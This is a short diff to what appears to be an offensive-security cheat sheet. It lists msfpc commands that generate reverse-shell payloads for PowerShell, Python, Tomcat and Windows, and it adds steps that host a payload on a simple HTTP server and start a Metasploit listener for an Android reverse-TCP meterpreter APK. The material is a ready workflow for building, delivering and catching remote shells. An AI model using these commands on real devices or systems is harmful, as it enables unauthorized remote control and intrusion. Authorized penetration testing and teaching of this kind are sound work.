@@ -29,3 +29,10 @@ $ msfpc powershell lhost lport
 $ msfpc python lhost lport
 $ msfpc tomcat lhost lport
 $ msfpc windows lhost lport
+
+#Share payload
+python2 -m SimpleHTTPServer 8080
+
+#Start the session
+msfconsole -q -r '/root/android-meterpreter-stageless-reverse-tcp-1234.apk.rc'
+
